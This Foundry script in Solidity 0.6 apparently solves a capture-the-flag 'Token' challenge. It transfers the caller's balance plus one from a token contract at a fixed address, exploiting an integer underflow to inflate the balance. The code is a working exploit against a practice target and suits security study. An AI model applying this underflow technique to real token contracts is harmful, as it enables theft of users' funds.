// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        Token token = Token(0xe01742Ddc597B5891dd0bc5689e583c47837e1d5);
        token.transfer(address(0), token.balanceOf(tx.origin) + 1);

        vm.stopBroadcast();
    }
}

// tx.origin must be player address